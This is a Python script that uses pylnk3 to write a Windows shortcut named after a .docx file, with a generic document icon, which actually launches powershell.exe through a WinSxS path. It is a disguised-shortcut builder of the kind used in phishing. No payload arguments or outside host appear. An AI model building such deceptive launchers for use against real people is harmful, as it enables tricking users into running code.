import pylnk3
from . import pylnk3_patch
from . import path_operations
import os

class Document:
    def __init__(self, document_path=None):
        self.document_extensions = ["docx"]
        self.document_path = None

        if type(document_path) == str or type(document_path) == unicode:
            self.document_path = document_path
            try:
                file_handle = open(self.document_path, 'rb')
            except IOError:
                for document_extension in self.document_extensions:
                    extended_path = document_path + "."  + document_extension
                    try:
                        self.document_path = extended_path
                        file_handle = open(self.document_path, 'rb')
                        break
                    except IOError:
                        self.document_path = "untitled.docx"
                        continue

        # Defualts
        self.icon_path = "C:\\Windows\\System32\\imageres.dll" # Contains generic Windows icons
        self.icon_index = 85 # Index within imageres.dll for document icon

def write_lnk_using_document(target, document):
    try:
        pylnk3.for_file(
            target_file=target,
            lnk_name=os.path.basename(document.document_path) + ".lnk",
            arguments=None,
            description=None,
            icon_file=document.icon_path,
            icon_index=document.icon_index,
            work_dir=path_operations.get_directory(document.document_path),
            window_mode=None,
        )

    except Exception as e:
        print(f"An error occured while writing .lnk file: {e}")

def main():
    document = Document(r'testdocument')
    target = "C:\\Windows\\WinSxS\\amd64_microsoft-windows-powershell-exe_31bf3856ad364e35_10.0.19041.3996_none_dd93276fb79a0397\\powershell.exe"
    write_lnk_using_document(target, document)

if __name__ == "__main__":
    main()